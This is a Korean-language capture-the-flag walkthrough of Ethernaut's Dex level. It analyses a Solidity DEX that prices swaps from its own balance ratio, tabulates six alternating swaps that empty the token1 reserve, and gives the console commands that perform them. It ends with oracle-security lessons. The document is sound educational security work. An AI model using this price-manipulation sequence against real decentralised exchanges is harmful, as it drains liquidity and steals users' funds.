# Ethernaut Level 22 - Dex

## 문제 설명

DEX의 가격 계산 취약점을 이용해 token1 또는 token2를 모두 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Dex {
    address public token1;
    address public token2;

    function getSwapPrice(address from, address to, uint amount) public view returns(uint) {
        return (amount * IERC20(to).balanceOf(address(this))) /
                IERC20(from).balanceOf(address(this));
    }

    function swap(address from, address to, uint amount) public {
        require((from == token1 && to == token2) ||
                (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough");
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }
}
```

---

## 취약점 분석

### 온체인 가격 조작

가격 계산 공식:
```
price = amount * toBalance / fromBalance
```

반복 스왑 시 DEX 내 토큰 비율이 점점 무너진다.

### 스왑 시뮬레이션

초기 상태: DEX(token1=100, token2=100), 플레이어(token1=10, token2=10)

| 회차 | 방향 | 보내는 양 | 받는 양 | DEX t1 | DEX t2 | 플레이어 t1 | 플레이어 t2 |
|---|---|---|---|---|---|---|---|
| 1 | t1→t2 | 10 | 10 | 110 | 90 | 0 | 20 |
| 2 | t2→t1 | 20 | 24 | 86 | 110 | 24 | 0 |
| 3 | t1→t2 | 24 | 30 | 110 | 80 | 0 | 30 |
| 4 | t2→t1 | 30 | 41 | 69 | 110 | 41 | 0 |
| 5 | t1→t2 | 41 | 65 | 110 | 45 | 0 | 65 |
| 6 | t2→t1 | 45 | 110 | 0 | 90 | 110 | 20 |

→ 6회 스왑 후 DEX의 token1 잔액 = 0

---

## 공격 단계

### Step 1 — 토큰 주소 확인

```js
let t1 = await contract.token1()
let t2 = await contract.token2()
```

### Step 2 — approve

```js
await contract.approve(contract.address, 500)
```

### Step 3 — 반복 스왑

```js
await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
```

### Step 4 — 확인

```js
await contract.balanceOf(t1, contract.address)
// → 0
```

---

## 핵심 교훈

- 온체인 단일 소스 가격 오라클은 조작 가능
- AMM에서 잔액 비율 기반 가격 계산은 플래시론 공격에 취약
- Chainlink 등 외부 분산형 오라클 사용 권장
- TWAP(시간 가중 평균 가격) 방식으로 조작 난이도 상승 가능
